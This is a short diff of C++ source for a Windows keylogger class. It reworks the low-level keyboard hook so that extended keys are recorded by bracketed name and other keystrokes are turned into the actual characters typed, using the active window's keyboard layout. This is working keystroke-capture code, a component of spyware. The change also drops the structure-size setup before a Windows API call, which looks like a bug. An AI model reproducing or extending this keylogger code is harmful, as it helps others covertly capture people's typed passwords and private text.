@@ -58,6 +58,8 @@ void KeyLogger::InstallHook(void)
 
 LRESULT CALLBACK KeyLogger::LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam )
 {
+	const int KEYNAME_LENGTH = 20;
+
 	// This is needed according to MSDN
 	if (nCode >= 0)
 	{	
@@ -65,28 +67,32 @@ LRESULT CALLBACK KeyLogger::LowLevelKeyboardProc( int nCode, WPARAM wParam, LPAR
 
 		if (wParam == WM_KEYDOWN)
 		{
-			DWORD dwMsg = 1;
-			dwMsg += pKeyBoard->scanCode << 16;
-			dwMsg += pKeyBoard->flags << 24;
+			wchar_t key[KEYNAME_LENGTH] = {0}; // unicode!
 
-			const int KEYNAME_LENGTH = 20;
-			wchar_t keyname[KEYNAME_LENGTH]={0};
-			keyname[0] = L'[';
-			int act_length = GetKeyNameTextW(dwMsg, keyname+1, KEYNAME_LENGTH-1);
-			keyname[act_length + 1] = L']';
+			if (pKeyBoard->flags & LLKHF_EXTENDED) // is it extended char?
+			{
+				DWORD dwMsg = 1;
+				dwMsg += pKeyBoard->scanCode << 16;
+				dwMsg += pKeyBoard->flags << 24;
 
-			// This block retrieves keyboard layout of active window 
-			GUITHREADINFO guiThreadInfo;
-			guiThreadInfo.cbSize = sizeof(GUITHREADINFO);
-			GetGUIThreadInfo(0, &guiThreadInfo);
-			DWORD dwThreadID = GetWindowThreadProcessId(guiThreadInfo.hwndActive, NULL);
-			HKL layout = GetKeyboardLayout(dwThreadID);
+				// This block place key name into key wide string in a braces: [shift]
+				key[0] = L'[';
+				int act_length = GetKeyNameTextW(dwMsg, key+1, KEYNAME_LENGTH-1);
+				key[act_length + 1] = L']';
+			}
+			else // letter, digit...
+			{
+				// This block retrieves keyboard layout of active window 
+				GUITHREADINFO guiThreadInfo;
+				GetGUIThreadInfo(0, &guiThreadInfo);
+				DWORD dwThreadID = GetWindowThreadProcessId(guiThreadInfo.hwndActive, NULL);
+				HKL layout = GetKeyboardLayout(dwThreadID);
 
-			BYTE keyState[256];
-			GetKeyboardState(keyState);
-			wchar_t unicode = 0;
-
-			ToUnicodeEx(pKeyBoard->vkCode, pKeyBoard->scanCode, keyState, &unicode, 1, pKeyBoard->flags, layout);
+				// Translate to actual character depending on keyboard state and layout
+				BYTE keyState[256];
+				GetKeyboardState(keyState);
+				ToUnicodeEx(pKeyBoard->vkCode, pKeyBoard->scanCode, keyState, key, 1, pKeyBoard->flags, layout);
+			}
 		}
 	}
 
